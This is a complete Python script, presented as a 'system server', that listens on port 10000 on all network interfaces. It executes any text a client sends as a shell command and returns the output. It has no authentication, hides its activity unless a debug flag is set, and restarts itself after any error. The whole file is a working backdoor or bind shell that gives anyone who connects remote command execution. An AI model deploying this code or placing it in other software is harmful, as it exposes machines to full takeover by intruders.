#!/usr/bin/python3

# -----------------------------------------------------------------------------
# Libraries
# -----------------------------------------------------------------------------
import socket
import time
import subprocess

# -----------------------------------------------------------------------------
# Global definitions
# -----------------------------------------------------------------------------
DEBUG = False
SERVER_IP = '0.0.0.0'
SERVER_PORT = 10000
PKT_SIZE = 1024

# -----------------------------------------------------------------------------
# Functions
# -----------------------------------------------------------------------------
def start_system_server():
    if DEBUG: print("[MSG]> start system server")
    
    # Open listening socket
    server_socket = socket.socket()
    server_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
    server_socket.bind((SERVER_IP, SERVER_PORT))
    server_socket.listen(0)
    
    while True:
        # Server is listening
        if DEBUG: print("[MSG]> listening on %s:%d" % (SERVER_IP, SERVER_PORT))
        (client_socket, client_address) = server_socket.accept()
        
        # Receive command        
        if DEBUG: print("[MSG]> connection from %s:%d" % (client_address))
        data = client_socket.recv(PKT_SIZE)
        data = data.decode()
        
        # Execute command and get output
        if DEBUG: print("executing command: {}".format(data))
        output = subprocess.check_output(data, shell=True)
        
        # Send output
        if DEBUG: print("command output\r\n{}".format(output))
        client_socket.sendall(output)
        client_socket.close()
        
# -----------------------------------------------------------------------------
# Main
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    while True:
        try:
            start_system_server()
        except BaseException as e:
            if DEBUG: print("[MSG]> error: exception %s" % e)
        time.sleep(1)
